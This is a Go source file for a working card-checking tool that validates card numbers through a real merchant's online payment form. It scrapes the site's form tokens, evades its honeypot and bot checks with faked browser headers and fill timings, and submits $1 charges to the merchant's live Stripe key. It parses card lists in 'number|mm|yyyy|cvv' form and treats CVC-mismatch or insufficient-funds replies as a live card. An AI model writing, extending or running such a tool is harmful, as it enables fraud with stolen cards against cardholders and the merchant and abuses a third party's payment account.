package main

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/google/uuid"
)

// ============================
// Configuration — defaults (overridden by API requests)
// ============================

type CardConfig struct {
	FirstName    string `json:"first_name"`
	LastName     string `json:"last_name"`
	Email        string `json:"email"`
	Address1     string `json:"address1"`
	Address2     string `json:"address2"`
	City         string `json:"city"`
	State        string `json:"state"`
	ZipCode      string `json:"zip_code"`
	Country      string `json:"country"`
	CountryCode  string `json:"country_code"`
	InvoiceNum   string `json:"invoice_num"`
	Currency     string `json:"currency"`
	Amount       string `json:"amount"`
	CardNumber   string `json:"card_number"`
	CardCVC      string `json:"card_cvc"`
	CardExpYear  string `json:"card_exp_year"`
	CardExpMonth string `json:"card_exp_month"`
}

var defaultConfig = CardConfig{
	FirstName:   "james",
	LastName:    "Anderson",
	Email:       "dasfsdfa@gmail.com",
	Address1:    "SDFFDSF@GMAIL.COM",
	Address2:    "SDFFDSF@GMAIL.COM",
	City:        "New York",
	State:       "NY",
	ZipCode:     "10080",
	Country:     "United States",
	CountryCode: "US",
	InvoiceNum:  "13513",
	Currency:    "USD",
	Amount:      "$1.00",
}

// fillDefaults applies default values to empty fields in a CardConfig
func fillDefaults(c CardConfig) CardConfig {
	if c.FirstName == "" {
		c.FirstName = defaultConfig.FirstName
	}
	if c.LastName == "" {
		c.LastName = defaultConfig.LastName
	}
	if c.Email == "" {
		c.Email = defaultConfig.Email
	}
	if c.Address1 == "" {
		c.Address1 = defaultConfig.Address1
	}
	if c.Address2 == "" {
		c.Address2 = defaultConfig.Address2
	}
	if c.City == "" {
		c.City = defaultConfig.City
	}
	if c.State == "" {
		c.State = defaultConfig.State
	}
	if c.ZipCode == "" {
		c.ZipCode = defaultConfig.ZipCode
	}
	if c.Country == "" {
		c.Country = defaultConfig.Country
	}
	if c.CountryCode == "" {
		c.CountryCode = defaultConfig.CountryCode
	}
	if c.InvoiceNum == "" {
		c.InvoiceNum = defaultConfig.InvoiceNum
	}
	if c.Currency == "" {
		c.Currency = defaultConfig.Currency
	}
	if c.Amount == "" {
		c.Amount = defaultConfig.Amount
	}
	return c
}

// parseCardLine parses "number|mm|yyyy|cvv" into a CardConfig (card fields only)
func parseCardLine(line string) (CardConfig, bool) {
	parts := strings.FieldsFunc(line, func(r rune) bool {
		return r == '|' || r == '/' || r == ','
	})
	if len(parts) < 4 {
		return CardConfig{}, false
	}
	number := strings.TrimSpace(parts[0])
	month := strings.TrimSpace(parts[1])
	yearStr := strings.TrimSpace(parts[2])
	cvv := strings.TrimSpace(parts[3])

	// Normalize year: "2028" -> "28", "28" stays "28"
	if len(yearStr) == 4 {
		yearStr = yearStr[2:]
	}
	// Normalize month: "03" stays "03", "3" -> "03"
	if len(month) == 1 {
		month = "0" + month
	}

	return CardConfig{
		CardNumber:   number,
		CardCVC:      cvv,
		CardExpYear:  yearStr,
		CardExpMonth: month,
	}, true
}

// pageTokens holds dynamic values extracted from the page HTML
type pageTokens struct {
	GformCurrency string
	State2        string
	VersionHash   string
	HoneypotName  string
	HoneypotValue string
	Nonce         string
	GformAjax     string
}

// ============================
// Helpers
// ============================

func randomHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

func generateTrackingID() string {
	return randomHex(4)
}

func generateGUID() string {
	return uuid.New().String() + randomHex(3)
}

func generateSessionID() string {
	return uuid.New().String()
}

func generateStripeFingerprintID() string {
	return uuid.New().String() + randomHex(3)
}

// setCommonHeaders applies realistic browser headers to the request.
func setCommonHeaders(req *http.Request, origin, referer string) {
	req.Header.Set("accept", "*/*")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("origin", origin)
	req.Header.Set("referer", referer)
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("sec-ch-ua", `"Chromium";v="136", "Not-A.Brand";v="24", "Microsoft Edge";v="136"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0")
}

func addFormField(w *multipart.Writer, name, value string) {
	f, err := w.CreateFormField(name)
	if err != nil {
		log.Fatalf("creating form field %q: %v", name, err)
	}
	if _, err := f.Write([]byte(value)); err != nil {
		log.Fatalf("writing form field %q: %v", name, err)
	}
}

// extractPageTokens parses the HTML to extract all dynamic form tokens.
func extractPageTokens(html string) pageTokens {
	var t pageTokens

	// --- gform_currency ---
	// <input type='hidden' name='gform_currency' value='...' />
	// or could be in a <script> tag or data attribute
	re := regexp.MustCompile(`name=['"]gform_currency['"][^>]*value=['"]([^'"]+)['"]`)
	if m := re.FindStringSubmatch(html); len(m) > 1 {
		t.GformCurrency = m[1]
	}
	// Try reversed attribute order: value before name
	if t.GformCurrency == "" {
		re = regexp.MustCompile(`value=['"]([^'"]+)['"][^>]*name=['"]gform_currency['"]`)
		if m := re.FindStringSubmatch(html); len(m) > 1 {
			t.GformCurrency = m[1]
		}
	}

	// --- state_2 ---
	re = regexp.MustCompile(`name=['"]state_2['"][^>]*value=['"]([^'"]+)['"]`)
	if m := re.FindStringSubmatch(html); len(m) > 1 {
		t.State2 = m[1]
	}
	if t.State2 == "" {
		re = regexp.MustCompile(`value=['"]([^'"]+)['"][^>]*name=['"]state_2['"]`)
		if m := re.FindStringSubmatch(html); len(m) > 1 {
			t.State2 = m[1]
		}
	}

	// --- version_hash ---
	// Can appear as hidden input or in JS: "version_hash":"<hash>"
	re = regexp.MustCompile(`name=['"]version_hash['"][^>]*value=['"]([a-f0-9]{32})['"]`)
	if m := re.FindStringSubmatch(html); len(m) > 1 {
		t.VersionHash = m[1]
	}
	if t.VersionHash == "" {
		re = regexp.MustCompile(`value=['"]([a-f0-9]{32})['"][^>]*name=['"]version_hash['"]`)
		if m := re.FindStringSubmatch(html); len(m) > 1 {
			t.VersionHash = m[1]
		}
	}
	if t.VersionHash == "" {
		re = regexp.MustCompile(`"version_hash"\s*:\s*"([a-f0-9]{32})"`)
		if m := re.FindStringSubmatch(html); len(m) > 1 {
			t.VersionHash = m[1]
		}
	}

	// --- Honeypot field ---
	// Gravity Forms creates a hidden field with a random-looking name like "taxzwq8683"
	// It's typically a <div class="gform_validation_container"> containing an input
	// Pattern: <input name="<random>" type="text" ... inside validation_container
	re = regexp.MustCompile(`gform_validation_container[^>]*>.*?<input[^>]*name=['"]([a-z]+\d+)['"]`)
	if m := re.FindStringSubmatch(html); len(m) > 1 {
		t.HoneypotName = m[1]
	}
	// Fallback: look for the known pattern of tax + random chars + digits
	if t.HoneypotName == "" {
		re = regexp.MustCompile(`name=['"]([a-z]{2,6}\w{2,8}\d{3,6})['"][^>]*(?:tabindex|autocomplete)`)
		if m := re.FindStringSubmatch(html); len(m) > 1 {
			t.HoneypotName = m[1]
		}
	}
	// The honeypot value should be empty on submission (it's an anti-bot field)
	t.HoneypotValue = ""

	// --- Nonce ---
	// Found in page source as: ,"validate_form_nonce":"7bd1ec47fd"
	re = regexp.MustCompile(`"validate_form_nonce"\s*:\s*"([a-f0-9]+)"`)
	if m := re.FindStringSubmatch(html); len(m) > 1 {
		t.Nonce = m[1]
	}
	// Fallback patterns
	if t.Nonce == "" {
		re = regexp.MustCompile(`"nonce"\s*:\s*"([a-f0-9]{10,})"`)
		if m := re.FindStringSubmatch(html); len(m) > 1 {
			t.Nonce = m[1]
		}
	}

	// --- gform_ajax string ---
	// Pattern: data-formid='2' data-ajax='form_id=2&title=...&hash=...'
	// or in JS: gformInitSpinner(2, 'https://...')
	re = regexp.MustCompile(`data-ajax=['"]([^'"]+)['"]`)
	if m := re.FindStringSubmatch(html); len(m) > 1 {
		t.GformAjax = strings.ReplaceAll(m[1], "&amp;", "&")
	}
	// Fallback: look in JS variable
	if t.GformAjax == "" {
		re = regexp.MustCompile(`form_id=2&[^'"&]*hash=[a-f0-9]{32}`)
		if m := re.FindString(html); m != "" {
			t.GformAjax = strings.ReplaceAll(m, "&amp;", "&")
		}
	}

	return t
}

// ============================
// Result type for API responses
// ============================

type CheckResult struct {
	Status      string  `json:"status"`       // charged, declined, error, 3ds_required, unknown
	Code        string  `json:"code"`         // raw Stripe status/error code
	Message     string  `json:"message"`      // human-readable message
	Card        string  `json:"card"`         // masked card for reference
	Amount      string  `json:"amount"`       // amount attempted
	RawResponse string  `json:"raw_response"` // full Stripe response JSON
	Elapsed     float64 `json:"elapsed"`      // seconds taken
}

// classifyStripeResponse determines the status from a Stripe payment intent response
func classifyStripeResponse(statusCode int, body []byte) (status, code, message string) {
	var resp map[string]interface{}
	if err := json.Unmarshal(body, &resp); err != nil {
		return "error", "PARSE_ERROR", "failed to parse Stripe response"
	}

	// Check for Stripe error object
	if errObj, ok := resp["error"].(map[string]interface{}); ok {
		code, _ := errObj["code"].(string)
		declineCode, _ := errObj["decline_code"].(string)
		msg, _ := errObj["message"].(string)

		if declineCode != "" {
			code = declineCode
		}

		upperCode := strings.ToUpper(code)
		switch {
		case strings.Contains(upperCode, "INCORRECT_CVC") || strings.Contains(upperCode, "INVALID_CVC"):
			return "approved", code, msg // CVV mismatch = card alive
		case strings.Contains(upperCode, "STOLEN") || strings.Contains(upperCode, "LOST") || strings.Contains(upperCode, "PICKUP"):
			return "declined", code, msg
		case strings.Contains(upperCode, "EXPIRED"):
			return "declined", code, msg
		case strings.Contains(upperCode, "INSUFFICIENT"):
			return "approved", code, msg // insufficient funds = card alive
		case strings.Contains(upperCode, "DECLINED") || strings.Contains(upperCode, "DO_NOT"):
			return "declined", code, msg
		case strings.Contains(upperCode, "FRAUDULENT"):
			return "declined", code, msg
		case strings.Contains(upperCode, "INCORRECT_NUMBER") || strings.Contains(upperCode, "INVALID_NUMBER"):
			return "declined", code, msg
		case strings.Contains(upperCode, "PROCESSING_ERROR"):
			return "declined", code, msg
		default:
			return "declined", code, msg
		}
	}

	// Check payment intent status
	piStatus, _ := resp["status"].(string)
	switch piStatus {
	case "succeeded":
		return "charged", "SUCCESS", "payment succeeded"
	case "requires_action":
		return "3ds_required", "3DS_REQUIRED", "3D Secure authentication required"
	case "requires_capture":
		return "charged", "REQUIRES_CAPTURE", "payment authorized"
	case "requires_payment_method":
		// Check for last_payment_error
		if lastErr, ok := resp["last_payment_error"].(map[string]interface{}); ok {
			code, _ := lastErr["code"].(string)
			msg, _ := lastErr["message"].(string)
			declineCode, _ := lastErr["decline_code"].(string)
			if declineCode != "" {
				code = declineCode
			}
			return "declined", code, msg
		}
		return "declined", "REQUIRES_PAYMENT_METHOD", "payment method failed"
	case "processing":
		return "unknown", "PROCESSING", "payment is processing"
	case "canceled":
		return "declined", "CANCELED", "payment was canceled"
	}

	if statusCode == 402 {
		return "declined", "PAYMENT_FAILED", "payment failed"
	}

	return "unknown", "UNKNOWN", fmt.Sprintf("unexpected status: %s", piStatus)
}

// processCard runs the full Stripe checkout flow and returns a result
func processCard(cfg CardConfig) CheckResult {
	start := time.Now()

	// --- Session setup ---
	jar, err := cookiejar.New(nil)
	if err != nil {
		return CheckResult{Status: "error", Code: "SESSION_ERROR", Message: err.Error(), Elapsed: time.Since(start).Seconds()}
	}

	client := &http.Client{
		Jar:     jar,
		Timeout: 30 * time.Second,
	}

	// Generate dynamic session identifiers
	trackingID := generateTrackingID()
	clientSessionID := generateSessionID()
	guid := generateGUID()
	stripeMUID := generateStripeFingerprintID()
	stripeSID := generateStripeFingerprintID()

	maskedCard := maskCard(cfg.CardNumber)

	fmt.Println("=== Session Info ===")
	fmt.Println("Tracking ID:       ", trackingID)
	fmt.Println("Client Session ID: ", clientSessionID)
	fmt.Println("Card:              ", maskedCard)
	fmt.Println()

	// -------------------------------------------------------
	// Step 0: Visit the payment page — get cookies + tokens
	// -------------------------------------------------------
	fmt.Println("[Step 0] Visiting payment page to establish session and extract tokens...")

	pageReq, err := http.NewRequest("GET", "https://www.kirkprocess.com/pay-online/", nil)
	if err != nil {
		return CheckResult{Status: "error", Code: "REQUEST_ERROR", Message: err.Error(), Card: maskedCard, Elapsed: time.Since(start).Seconds()}
	}
	pageReq.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	pageReq.Header.Set("accept-language", "en-US,en;q=0.9")
	pageReq.Header.Set("sec-ch-ua", `"Chromium";v="136", "Not-A.Brand";v="24", "Microsoft Edge";v="136"`)
	pageReq.Header.Set("sec-ch-ua-mobile", "?0")
	pageReq.Header.Set("sec-ch-ua-platform", `"Windows"`)
	pageReq.Header.Set("sec-fetch-dest", "document")
	pageReq.Header.Set("sec-fetch-mode", "navigate")
	pageReq.Header.Set("sec-fetch-site", "none")
	pageReq.Header.Set("sec-fetch-user", "?1")
	pageReq.Header.Set("upgrade-insecure-requests", "1")
	pageReq.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0")

	pageResp, err := client.Do(pageReq)
	if err != nil {
		return CheckResult{Status: "error", Code: "PAGE_ERROR", Message: err.Error(), Card: maskedCard, Elapsed: time.Since(start).Seconds()}
	}

	pageBody, err := io.ReadAll(pageResp.Body)
	pageResp.Body.Close()
	if err != nil {
		return CheckResult{Status: "error", Code: "READ_ERROR", Message: err.Error(), Card: maskedCard, Elapsed: time.Since(start).Seconds()}
	}

	fmt.Printf("  Page status: %d\n", pageResp.StatusCode)

	if pageResp.StatusCode != 200 {
		return CheckResult{Status: "error", Code: fmt.Sprintf("HTTP_%d", pageResp.StatusCode), Message: "page returned non-200", Card: maskedCard, Elapsed: time.Since(start).Seconds()}
	}

	// Parse dynamic tokens from the page HTML
	tokens := extractPageTokens(string(pageBody))

	fmt.Println("  === Extracted Tokens ===")
	fmt.Println("  gform_currency: ", tokens.GformCurrency)
	fmt.Println("  state_2:        ", tokens.State2)
	fmt.Println("  version_hash:   ", tokens.VersionHash)
	fmt.Println("  honeypot field: ", tokens.HoneypotName)
	fmt.Println("  nonce:          ", tokens.Nonce)
	fmt.Println("  gform_ajax:     ", tokens.GformAjax)

	if tokens.GformCurrency == "" {
		return CheckResult{Status: "error", Code: "MISSING_CURRENCY", Message: "could not extract gform_currency from page", Card: maskedCard, Elapsed: time.Since(start).Seconds()}
	}
	if tokens.State2 == "" {
		return CheckResult{Status: "error", Code: "MISSING_STATE", Message: "could not extract state_2 from page", Card: maskedCard, Elapsed: time.Since(start).Seconds()}
	}
	if tokens.Nonce == "" {
		return CheckResult{Status: "error", Code: "MISSING_NONCE", Message: "could not extract nonce from page", Card: maskedCard, Elapsed: time.Since(start).Seconds()}
	}

	fmt.Println()

	// Small delay to mimic real user filling in a form
	time.Sleep(2 * time.Second)

	// -------------------------------------------------------
	// Step 1: Request 1 — Gravity Forms Stripe validation
	// -------------------------------------------------------
	fmt.Println("[Step 1] Sending form validation request...")

	form := new(bytes.Buffer)
	writer := multipart.NewWriter(form)

	// Personal info
	addFormField(writer, "input_1.3", cfg.FirstName)
	addFormField(writer, "input_1.6", cfg.LastName)
	addFormField(writer, "input_2", cfg.Email)

	// Address
	addFormField(writer, "input_11.1", cfg.Address1)
	addFormField(writer, "input_11.2", cfg.Address2)
	addFormField(writer, "input_11.3", cfg.City)
	addFormField(writer, "input_11.4", cfg.State)
	addFormField(writer, "input_11.5", cfg.ZipCode)
	addFormField(writer, "input_11.6", cfg.Country)

	// Payment info
	addFormField(writer, "input_10", cfg.InvoiceNum)
	addFormField(writer, "input_6", cfg.Currency)
	addFormField(writer, "input_7", cfg.Amount)
	addFormField(writer, "input_5", cfg.Amount)

	// Gravity Forms metadata
	addFormField(writer, "gform_submission_method", "iframe")
	addFormField(writer, "gform_theme", "gravity-theme")
	addFormField(writer, "gform_style_settings", "[]")
	addFormField(writer, "is_submit_2", "1")

	// *** Dynamic tokens from page HTML ***
	addFormField(writer, "gform_currency", tokens.GformCurrency)
	addFormField(writer, "gform_unique_id", "")
	addFormField(writer, "state_2", tokens.State2)
	addFormField(writer, "gform_target_page_number_2", "0")
	addFormField(writer, "gform_source_page_number_2", "1")
	addFormField(writer, "gform_field_values", "")
	addFormField(writer, "alt_s", "")

	// Honeypot — must send empty value (it's an anti-bot trap)
	if tokens.HoneypotName != "" {
		addFormField(writer, tokens.HoneypotName, tokens.HoneypotValue)
	}

	if tokens.VersionHash != "" {
		addFormField(writer, "version_hash", tokens.VersionHash)
	}

	// Simulate realistic form fill time (25–50 seconds)
	formFillTime := 25000 + (time.Now().UnixNano() % 25000)
	addFormField(writer, "gform_submission_speeds", fmt.Sprintf(`{"pages":{"1":[%d]}}`, formFillTime))

	// Action + identifiers
	addFormField(writer, "action", "gfstripe_validate_form")
	addFormField(writer, "feed_id", "1")
	addFormField(writer, "form_id", "2")
	addFormField(writer, "tracking_id", trackingID)
	addFormField(writer, "payment_method", "card")

	// Dynamic nonce from page
	addFormField(writer, "nonce", tokens.Nonce)

	// gform_ajax stripe temp string (dynamic hash from page)
	if tokens.GformAjax != "" {
		addFormField(writer, "gform_ajax--stripe-temp", tokens.GformAjax)
	}

	writer.Close()

	req1, err := http.NewRequest("POST", "https://www.kirkprocess.com/wp-admin/admin-ajax.php", form)
	if err != nil {
		return CheckResult{Status: "error", Code: "REQUEST_ERROR", Message: err.Error(), Card: maskedCard, Elapsed: time.Since(start).Seconds()}
	}
	setCommonHeaders(req1, "https://www.kirkprocess.com", "https://www.kirkprocess.com/pay-online/")
	req1.Header.Set("Content-Type", writer.FormDataContentType())

	resp1, err := client.Do(req1)
	if err != nil {
		return CheckResult{Status: "error", Code: "VALIDATION_ERROR", Message: err.Error(), Card: maskedCard, Elapsed: time.Since(start).Seconds()}
	}
	defer resp1.Body.Close()

	body1, err := io.ReadAll(resp1.Body)
	if err != nil {
		return CheckResult{Status: "error", Code: "READ_ERROR", Message: err.Error(), Card: maskedCard, Elapsed: time.Since(start).Seconds()}
	}

	fmt.Printf("  Status: %d\n", resp1.StatusCode)
	fmt.Printf("  Response: %s\n\n", string(body1))

	// -------------------------------------------------------
	// Step 2: Parse dynamic values from Request 1 response
	// -------------------------------------------------------
	fmt.Println("[Step 2] Parsing dynamic values from response...")

	var result map[string]interface{}
	if err := json.Unmarshal(body1, &result); err != nil {
		return CheckResult{Status: "error", Code: "JSON_PARSE_ERROR", Message: fmt.Sprintf("failed to parse validation response: %v", err), Card: maskedCard, RawResponse: string(body1), Elapsed: time.Since(start).Seconds()}
	}

	piID, clientSecret, resumeToken, elementsSessionID := extractStripeValues(result)

	if piID == "" || clientSecret == "" {
		return CheckResult{Status: "error", Code: "MISSING_INTENT", Message: "could not extract payment intent from response", Card: maskedCard, RawResponse: string(body1), Elapsed: time.Since(start).Seconds()}
	}

	fmt.Println("  Payment Intent ID:    ", piID)
	fmt.Println("  Client Secret:        ", clientSecret)
	fmt.Println("  Resume Token:         ", resumeToken)
	fmt.Println("  Elements Session ID:  ", elementsSessionID)
	fmt.Println()

	// Small delay to mimic user entering card details
	time.Sleep(3 * time.Second)

	// -------------------------------------------------------
	// Step 3: Request 2 — Stripe payment intent confirmation
	// -------------------------------------------------------
	fmt.Println("[Step 3] Sending Stripe payment confirmation...")

	returnURL := fmt.Sprintf(
		"https://www.kirkprocess.com/pay-online/?resume_token=%s&feed_id=1&form_id=2&tracking_id=%s",
		url.QueryEscape(resumeToken),
		url.QueryEscape(trackingID),
	)

	formData := url.Values{}
	formData.Set("return_url", returnURL)

	// Billing details
	formData.Set("payment_method_data[billing_details][address][line1]", cfg.Address1)
	formData.Set("payment_method_data[billing_details][address][line2]", cfg.Address2)
	formData.Set("payment_method_data[billing_details][address][city]", cfg.City)
	formData.Set("payment_method_data[billing_details][address][state]", cfg.State)
	formData.Set("payment_method_data[billing_details][address][postal_code]", cfg.ZipCode)
	formData.Set("payment_method_data[billing_details][address][country]", cfg.CountryCode)

	// Card details
	formData.Set("payment_method_data[type]", "card")
	formData.Set("payment_method_data[card][number]", cfg.CardNumber)
	formData.Set("payment_method_data[card][cvc]", cfg.CardCVC)
	formData.Set("payment_method_data[card][exp_year]", cfg.CardExpYear)
	formData.Set("payment_method_data[card][exp_month]", cfg.CardExpMonth)

	// Stripe metadata
	formData.Set("payment_method_data[allow_redisplay]", "unspecified")
	formData.Set("payment_method_data[pasted_fields]", "number")
	formData.Set("payment_method_data[payment_user_agent]", "stripe.js/dc6a844192; stripe-js-v3/dc6a844192; payment-element; deferred-intent; autopm")
	formData.Set("payment_method_data[referrer]", "https://www.kirkprocess.com")

	timeOnPage := 30000 + (time.Now().UnixNano() % 30000)
	formData.Set("payment_method_data[time_on_page]", fmt.Sprintf("%d", timeOnPage))

	// Client attribution
	formData.Set("payment_method_data[client_attribution_metadata][client_session_id]", clientSessionID)
	formData.Set("payment_method_data[client_attribution_metadata][merchant_integration_source]", "elements")
	formData.Set("payment_method_data[client_attribution_metadata][merchant_integration_subtype]", "payment-element")
	formData.Set("payment_method_data[client_attribution_metadata][merchant_integration_version]", "2021")
	formData.Set("payment_method_data[client_attribution_metadata][payment_intent_creation_flow]", "deferred")
	formData.Set("payment_method_data[client_attribution_metadata][payment_method_selection_flow]", "automatic")
	if elementsSessionID != "" {
		formData.Set("payment_method_data[client_attribution_metadata][elements_session_id]", elementsSessionID)
	}
	elementsSessionConfigID := generateSessionID()
	formData.Set("payment_method_data[client_attribution_metadata][elements_session_config_id]", elementsSessionConfigID)
	formData.Set("payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]", "payment")

	// Device fingerprint IDs
	formData.Set("payment_method_data[guid]", guid)
	formData.Set("payment_method_data[muid]", stripeMUID)
	formData.Set("payment_method_data[sid]", stripeSID)

	// Payment context
	formData.Set("expected_payment_method_type", "card")
	formData.Set("client_context[currency]", "usd")
	formData.Set("client_context[mode]", "payment")
	formData.Set("client_context[capture_method]", "automatic")
	formData.Set("client_context[payment_method_options][us_bank_account][verification_method]", "instant")

	formData.Set("use_stripe_sdk", "true")
	formData.Set("key", "pk_live_51Q581h2K23YJbmcYVuOpKmRfNiMaFv15YfRrTG2oPcOaqVMi4IvyWmHDvlvJmbtlcFBh8PJexzKZinehHtuiBQ5C00W4PpR7Ml")

	// Top-level client attribution
	formData.Set("client_attribution_metadata[client_session_id]", clientSessionID)
	formData.Set("client_attribution_metadata[merchant_integration_source]", "elements")
	formData.Set("client_attribution_metadata[merchant_integration_subtype]", "payment-element")
	formData.Set("client_attribution_metadata[merchant_integration_version]", "2021")
	formData.Set("client_attribution_metadata[payment_intent_creation_flow]", "deferred")
	formData.Set("client_attribution_metadata[payment_method_selection_flow]", "automatic")
	if elementsSessionID != "" {
		formData.Set("client_attribution_metadata[elements_session_id]", elementsSessionID)
	}
	formData.Set("client_attribution_metadata[elements_session_config_id]", elementsSessionConfigID)
	formData.Set("client_attribution_metadata[merchant_integration_additional_elements][0]", "payment")

	formData.Set("client_secret", clientSecret)

	confirmURL := fmt.Sprintf("https://api.stripe.com/v1/payment_intents/%s/confirm", piID)

	req2, err := http.NewRequest("POST", confirmURL, strings.NewReader(formData.Encode()))
	if err != nil {
		return CheckResult{Status: "error", Code: "REQUEST_ERROR", Message: err.Error(), Card: maskedCard, Amount: cfg.Amount, Elapsed: time.Since(start).Seconds()}
	}

	req2.Header.Set("accept", "application/json")
	req2.Header.Set("accept-language", "en-US,en;q=0.9")
	req2.Header.Set("content-type", "application/x-www-form-urlencoded")
	req2.Header.Set("origin", "https://js.stripe.com")
	req2.Header.Set("referer", "https://js.stripe.com/")
	req2.Header.Set("priority", "u=1, i")
	req2.Header.Set("sec-ch-ua", `"Chromium";v="136", "Not-A.Brand";v="24", "Microsoft Edge";v="136"`)
	req2.Header.Set("sec-ch-ua-mobile", "?0")
	req2.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req2.Header.Set("sec-fetch-dest", "empty")
	req2.Header.Set("sec-fetch-mode", "cors")
	req2.Header.Set("sec-fetch-site", "same-site")
	req2.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0")

	resp2, err := client.Do(req2)
	if err != nil {
		return CheckResult{Status: "error", Code: "STRIPE_ERROR", Message: err.Error(), Card: maskedCard, Amount: cfg.Amount, Elapsed: time.Since(start).Seconds()}
	}
	defer resp2.Body.Close()

	body2, err := io.ReadAll(resp2.Body)
	if err != nil {
		return CheckResult{Status: "error", Code: "READ_ERROR", Message: err.Error(), Card: maskedCard, Amount: cfg.Amount, Elapsed: time.Since(start).Seconds()}
	}

	fmt.Printf("  Status: %d\n", resp2.StatusCode)
	fmt.Printf("  Response: %s\n", string(body2))

	// Classify the response
	status, code, message := classifyStripeResponse(resp2.StatusCode, body2)

	return CheckResult{
		Status:      status,
		Code:        code,
		Message:     message,
		Card:        maskedCard,
		Amount:      cfg.Amount,
		RawResponse: string(body2),
		Elapsed:     time.Since(start).Seconds(),
	}
}

// maskCard returns a masked version of a card number
func maskCard(number string) string {
	digits := strings.ReplaceAll(number, " ", "")
	if len(digits) >= 4 {
		return "**** **** **** " + digits[len(digits)-4:]
	}
	return "****"
}

// ============================
// Main — CLI mode
// ============================

func main() {
	if len(os.Args) > 1 && os.Args[1] == "-api" {
		runAPIServer()
		return
	}

	// Default: run with hardcoded test card (CLI mode)
	fmt.Println("Usage: stripe-go -api    (to start HTTP API server)")
	fmt.Println("       Starting in CLI test mode...")
	fmt.Println()

	cfg := fillDefaults(CardConfig{
		CardNumber:   "5356 6637 3799 1046",
		CardCVC:      "000",
		CardExpYear:  "30",
		CardExpMonth: "03",
	})

	result := processCard(cfg)
	out, _ := json.MarshalIndent(result, "", "  ")
	fmt.Println(string(out))
}

// ============================
// Response parsing helpers
// ============================

func extractStripeValues(data map[string]interface{}) (piID, clientSecret, resumeToken, elementsSessionID string) {
	for _, key := range []string{"pi_id", "payment_intent_id", "paymentIntentId", "id", "intent_id"} {
		if v, ok := data[key].(string); ok && strings.HasPrefix(v, "pi_") {
			piID = v
			break
		}
	}

	for _, key := range []string{"client_secret", "clientSecret", "secret"} {
		if v, ok := data[key].(string); ok && strings.Contains(v, "_secret_") {
			clientSecret = v
			break
		}
	}

	for _, key := range []string{"resume_token", "resumeToken", "token"} {
		if v, ok := data[key].(string); ok && v != "" {
			resumeToken = v
			break
		}
	}

	for _, key := range []string{"elements_session_id", "elementsSessionId", "session_id"} {
		if v, ok := data[key].(string); ok && v != "" {
			elementsSessionID = v
			break
		}
	}

	// Search nested objects recursively
	if piID == "" || clientSecret == "" {
		for _, v := range data {
			switch nested := v.(type) {
			case map[string]interface{}:
				pi, cs, rt, es := extractStripeValues(nested)
				if piID == "" && pi != "" {
					piID = pi
				}
				if clientSecret == "" && cs != "" {
					clientSecret = cs
				}
				if resumeToken == "" && rt != "" {
					resumeToken = rt
				}
				if elementsSessionID == "" && es != "" {
					elementsSessionID = es
				}
			case string:
				if piID == "" && strings.HasPrefix(nested, "pi_") && !strings.Contains(nested, "_secret_") {
					piID = nested
				}
				if clientSecret == "" && strings.Contains(nested, "_secret_") {
					clientSecret = nested
				}
			}
		}
	}

	return
}
